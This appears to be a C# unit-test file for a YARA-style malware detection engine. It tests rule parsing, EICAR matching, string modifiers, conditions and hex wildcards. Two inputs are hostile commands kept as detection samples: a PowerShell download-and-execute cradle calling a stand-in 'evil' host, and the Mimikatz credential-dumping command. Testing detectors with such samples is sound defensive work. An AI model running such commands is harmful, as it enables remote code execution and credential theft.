using Sentinel.Core.Detection;
using Sentinel.Core.Models;
using Xunit;

namespace Sentinel.Tests;

public class RuleEngineTests
{
    private static readonly string s_eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

    [Fact]
    public void Parse_DefaultPack_ProducesRules()
    {
        var rules = RuleEngine.Parse(DefaultRules.Content);
        Assert.True(rules.Count >= 8, $"expected >= 8 rules, got {rules.Count}: {string.Join(", ", rules.Select(r => r.Name))}");
        Assert.Contains(rules, r => r.Name == "eicar_test_file");
    }

    [Fact]
    public void EicarRule_Matches_EicarString()
    {
        var rules = RuleEngine.Parse(DefaultRules.Content);
        var bytes = System.Text.Encoding.ASCII.GetBytes(s_eicar + "\n");
        var matches = RuleEngine.Match(bytes, rules);
        var hit = Assert.Single(matches, m => m.Rule.Name == "eicar_test_file");
        Assert.Equal(Severity.Critical, hit.Rule.Severity);
        Assert.True(hit.Rule.Confidence > 0.9);
    }

    [Fact]
    public void EicarRule_DoesNotMatch_CleanText()
    {
        var rules = RuleEngine.Parse(DefaultRules.Content);
        var bytes = System.Text.Encoding.ASCII.GetBytes("hello world this is definitely not the eicar test file content");
        Assert.DoesNotContain(RuleEngine.Match(bytes, rules), m => m.Rule.Name == "eicar_test_file");
    }

    [Fact]
    public void DownloadCradleRule_Matches_PowerShellDownloadString()
    {
        var rules = RuleEngine.Parse(DefaultRules.Content);
        string script = "powershell -nop -c \"iex (New-Object Net.WebClient).DownloadString('http://evil/x.ps1'); Invoke-Expression $x\"";
        var matches = RuleEngine.Match(System.Text.Encoding.UTF8.GetBytes(script), rules);
        Assert.Contains(matches, m => m.Rule.Name == "powershell_download_execute");
    }

    [Fact]
    public void MimikatzRule_Matches_Sekurlsa()
    {
        var rules = RuleEngine.Parse(DefaultRules.Content);
        var matches = RuleEngine.Match(System.Text.Encoding.UTF8.GetBytes("sekurlsa::logonpasswords"), rules);
        Assert.Contains(matches, m => m.Rule.Name == "mimikatz_indicators");
    }

    [Fact]
    public void Nocase_And_Wide_Modifiers_Work()
    {
        string def = """
            rule wide_nocase {
              meta:
                severity = "medium"
              strings:
                $a = "check" nocase wide
              condition:
                $a
            }
            """;
        var rules = RuleEngine.Parse(def);
        Assert.Single(rules);
        // UTF-16LE "CHECK"
        var bytes = new byte[] { (byte)'C', 0, (byte)'H', 0, (byte)'E', 0, (byte)'C', 0, (byte)'K', 0 };
        Assert.Contains(RuleEngine.Match(bytes, rules), m => m.Rule.Name == "wide_nocase");
    }

    [Fact]
    public void ComplexConditions_ParseAndEvaluate()
    {
        string def = """
            rule complex {
              meta:
                severity = "high"
              strings:
                $a = "one"
                $b = "two"
                $c = "three"
              condition:
                $a and ($b or $c)
            }
            """;
        var rules = RuleEngine.Parse(def);
        var r = Assert.Single(rules);
        Assert.True(r.Condition is AndCondition);
        Assert.NotEmpty(RuleEngine.Match(System.Text.Encoding.UTF8.GetBytes("one two"), rules));
        Assert.Empty(RuleEngine.Match(System.Text.Encoding.UTF8.GetBytes("one"), rules));
        Assert.NotEmpty(RuleEngine.Match(System.Text.Encoding.UTF8.GetBytes("one three"), rules));
    }

    [Fact]
    public void NOfCondition_RequiresThreshold()
    {
        string def = """
            rule two_of {
              strings:
                $a = "alpha"
                $b = "beta"
                $c = "gamma"
              condition:
                2 of them
            }
            """;
        var rules = RuleEngine.Parse(def);
        Assert.Empty(RuleEngine.Match(System.Text.Encoding.UTF8.GetBytes("alpha"), rules));
        Assert.NotEmpty(RuleEngine.Match(System.Text.Encoding.UTF8.GetBytes("alpha beta"), rules));
    }

    [Fact]
    public void HexStrings_WithWildcards_Match()
    {
        string def = """
            rule hexwild {
              strings:
                $a = { 4D 5A ?? 00 }
              condition:
                $a
            }
            """;
        var rules = RuleEngine.Parse(def);
        var bytes = new byte[] { 0x4D, 0x5A, 0x90, 0x00, 0x00 };
        Assert.NotEmpty(RuleEngine.Match(bytes, rules));
        var miss = new byte[] { 0x4D, 0x5A, 0x90, 0x01, 0x00 };
        Assert.Empty(RuleEngine.Match(miss, rules));
    }

    [Fact]
    public void MalformedRules_AreSkipped_NotFatal()
    {
        string pack = """
            rule bad_regex {
              strings:
                $a = /.*evil.*/
              condition:
                $a
            }
            rule still_good {
              strings:
                $a = "fine"
              condition:
                $a
            }
            """;
        var rules = RuleEngine.Parse(pack);
        var good = Assert.Single(rules, r => r.Name == "still_good");
        Assert.NotEmpty(RuleEngine.Match(System.Text.Encoding.UTF8.GetBytes("fine"), [good]));
    }
}
